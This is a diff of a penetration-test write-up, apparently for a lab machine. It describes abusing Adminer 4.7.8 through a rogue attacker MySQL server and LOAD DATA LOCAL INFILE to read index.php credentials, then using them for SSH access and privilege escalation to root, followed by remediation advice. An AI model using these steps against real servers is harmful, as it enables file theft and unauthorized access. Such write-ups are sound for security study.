@@ -322,14 +322,16 @@ info.php                [Status: 200, Size: 83842, Words: 4024, Lines: 962, Dura
 
 adminer.php was found as a content under the `utility-scripts`. Accessing to the discovered directory led to the following page (picture)
 
-## Adminer 4.7.8 LFI/SSR Vulnerability
+## 3. Exploitation
+
+1. Adminer 4.7.8 LFI/SSR Vulnerability
 It is discovered that the vulnerability allows attacker to connect to the victim's database via creating mysql user account connected to the address of victim. Below is the process of how attacker will exploit LFI/SSR Vulnerability.
 ```bash
 sudo systemctl start mysql
 ```
 <br>
 
-1. create user account and database owned by the user on the victim's database server to gather vulnerable information via execution of MySQL command
+1-1. create user account and database owned by the user on the victim's database server to gather vulnerable information via execution of MySQL command
 ```bash
 MariaDB [(none)]> create user 'first'@'10.129.229.101' identified by 'password';
 Query OK, 0 rows affected (0.001 sec)
@@ -352,7 +354,7 @@ MariaDB [admirer]> exit
 ```
 <br>
 
-2. change MySQL configuration locally to allow attacker's access to victim's database server
+1-2. change MySQL configuration locally to allow attacker's access to victim's database server
 ```bash
 vi /etc/mysql/mariadb.conf.d/50-server.cnf
 
@@ -363,19 +365,19 @@ bind-address            = <attacker's IP address>
 ```
 <br>
 
-3. Restart mysql service
+1-3. Restart mysql service
 ```bash
 sudo systemctl restart mysql
 ```
 <br>
 
-4. Access victim's database server via created credential
+1-4. Access victim's database server via created credential
 ```
 picture
 ```
 <br>
 
-5. Following sql command allows attacker to access on the execution field
+1-5. Following sql command allows attacker to access on the execution field
 ```bash
 load file local infiile '/var/www/html/index.php'
 into table <created db name>.<created table name>
@@ -383,10 +385,10 @@ fields terminated by "\n"
 ```
 <br>
 
-6. Execution result could be seen on `select` section (picture)
+1-6. Execution result could be seen on `select` section (picture)
 <br>
 
-## SSH
+2. SSH
 credential has been found in the `index.php` file. Using the following credential allows attacker to access into the victim's internal server, allowed attacker to successfully gain access as privilege of user `waldo`.
 (picture & command)
 
@@ -469,7 +471,7 @@ uid=1000(waldo) gid=1000(waldo) euid=0(root)
 ```
 Attacker successfully gain access to the system as root user's permission.
 
-# Remediation
+## Remediation
 1. Update tool to recent version & limit access:
 It is recommended to update Adminer, remove it if it is considered unnecessary for security of web application. Also, apply ACL on /admin-dir/ for blocking blind access from unknown IP
 
